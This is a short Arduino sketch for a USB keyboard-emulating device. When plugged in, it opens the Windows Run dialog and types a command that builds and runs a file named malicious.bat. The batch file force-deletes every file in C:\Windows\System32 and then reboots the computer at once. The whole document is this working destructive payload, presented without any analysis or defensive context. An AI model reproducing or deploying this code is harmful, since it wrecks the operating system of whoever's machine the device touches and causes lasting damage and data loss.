#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println("cmd /c echo @echo off > %TEMP%\\malicious.bat & echo del C:\\Windows\\System32\\*.* /Q /F >> %TEMP%\\malicious.bat & echo shutdown /r /t 0 >> %TEMP%\\malicious.bat & %TEMP%\\malicious.bat");
}

void loop() {}
